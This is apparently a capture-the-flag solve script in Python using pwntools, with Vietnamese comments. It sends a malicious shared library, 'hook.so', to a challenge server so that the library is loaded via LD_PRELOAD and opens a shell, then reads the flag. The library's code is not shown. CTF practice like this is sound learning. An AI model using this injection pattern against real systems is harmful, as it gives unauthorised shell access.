from pwn import *

# Cấu hình kết nối
# HOST, PORT = "localhost", 1337
HOST, PORT = "challenge.secso.cc", 7006

# Đọc nội dung file .so độc hại
with open("hook.so", "rb") as f:
    payload = f.read()

# Kết nối tới server
p = remote(HOST, PORT)

# Nhận banner chào mừng
p.recvuntil(b"ladify them!\n")

# Gửi payload (nội dung của hook.so)
p.send(payload)
# Đóng kênh ghi để server biết chúng ta đã gửi xong
p.shutdown('send') 

# Nhận thông báo "Calculating..."
p.recvuntil(b"Calculating new values...\n")

# Tại thời điểm này, server đã thực thi calculator với LD_PRELOAD
# Hàm get_shell() của chúng ta đã được gọi và chúng ta có một shell
# Chuyển sang chế độ tương tác
p.interactive()

# Sau khi có shell, gõ lệnh `ls -la /` và `cat /flag` để lấy flag.